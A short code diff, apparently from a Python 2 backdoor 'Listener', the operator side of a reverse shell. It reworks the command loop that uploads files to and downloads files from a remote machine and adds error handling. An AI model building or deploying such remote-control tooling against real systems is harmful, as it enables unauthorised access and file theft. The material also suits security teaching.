@@ -123,15 +123,19 @@ class Listener:
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
-            result = self.execute_remotely(command)
 
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
 
-            elif command[0] == "upload":
-                file_content = self.read_file(command[1])
-                command.append(file_content)
                 result = self.execute_remotely(command)
+
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+
+            except Exception:
+                result = "[-] Error during command execution."
 
             print(result)
 
